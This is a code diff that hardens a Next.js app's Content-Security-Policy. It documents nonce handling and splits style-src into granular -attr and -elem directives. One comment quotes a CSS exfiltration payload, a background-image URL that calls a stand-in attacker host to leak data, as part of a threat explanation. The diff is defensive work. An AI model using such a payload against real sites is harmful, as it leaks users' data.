@@ -103,10 +103,37 @@ function hasSessionMarker(request: NextRequest): boolean {
 // `x-nonce` request header that Next.js reads during SSR. Dev mode still needs
 // 'unsafe-eval' for HMR / React Fast Refresh.
 //
-// style-src retains 'unsafe-inline' because Radix UI / recharts inject inline
-// style attributes that can't currently be nonce-tagged. Tightening this is
-// tracked as a separate follow-up — nonce-tagging styles requires either
-// a CSS-in-JS migration or a Radix upstream change.
+// Nonce wiring (#67): this follows Next.js' official CSP-nonce pattern exactly —
+// the middleware sets the `Content-Security-Policy` header on the *forwarded
+// request* (see `requestHeaders` below), and Next.js reads the nonce back out of
+// that header during render to stamp it onto its own <script> tags. We therefore
+// do NOT read the nonce manually in layout.tsx; doing so would double-apply it.
+// The wiring is verifiable only against rendered HTML (staging): the Next.js
+// bootstrap <script> tags must carry `nonce="…"`. Tracked as a staging check —
+// if they do not, the nonce is inert and script-src silently relies on 'self'.
+//
+// style-src is split into the granular -attr / -elem directives (#33) so the
+// permission for inline STYLE ATTRIBUTES is separated from inline <style>
+// ELEMENTS — this is the "differenzieren" step and the prerequisite for ever
+// dropping 'unsafe-inline' from one without the other:
+//
+//   • style-src-attr 'unsafe-inline' — REQUIRED and upstream-blocked: Radix UI
+//     and recharts write inline `style="…"` attributes (element.style.*) that
+//     cannot be nonce-tagged. Removing this needs a Radix/recharts upstream
+//     change or a CSS-in-JS migration.
+//   • style-src-elem 'self' 'unsafe-inline' — the only inline <style> element we
+//     emit is ChartStyle in src/components/ui/chart.tsx; next/font may also
+//     inject inline <style> at build time. Both would need nonce-tagging before
+//     'unsafe-inline' can go here — a verifiable-on-staging follow-up.
+//
+// Residual risk of the remaining 'unsafe-inline' is bounded by the rest of the
+// policy: the CSS-exfiltration vector called out in #33 (`background-image:
+// url(https://attacker/?leak=…)`) is governed by img-src, which is restricted
+// to 'self' data: blob: and the single backend origin — no wildcard host — so
+// an injected inline style cannot phone home to an arbitrary origin.
+//
+// The un-suffixed `style-src` is kept as a fallback for browsers that do not
+// support the granular -attr / -elem directives.
 
 const isDev = process.env.NODE_ENV !== "production"
 
@@ -126,7 +153,13 @@ function buildCsp(nonce: string): string {
   return [
     "default-src 'self'",
     `script-src ${scriptSrc}`,
+    // Fallback for browsers without -attr / -elem support; see the note above.
     "style-src 'self' 'unsafe-inline'",
+    "style-src-elem 'self' 'unsafe-inline'",
+    "style-src-attr 'unsafe-inline'",
+    // Kept aligned with next.config.mjs `images.remotePatterns` (#67): both the
+    // browser-facing img-src and the server-side optimiser allowlist trust only
+    // self + the backend origin (data:/blob: for inline previews).
     `img-src 'self' data: blob: ${BACKEND_ORIGIN}`,
     `connect-src 'self' ${BACKEND_ORIGIN} https://js.stripe.com`,
     "frame-src https://js.stripe.com https://hooks.stripe.com",
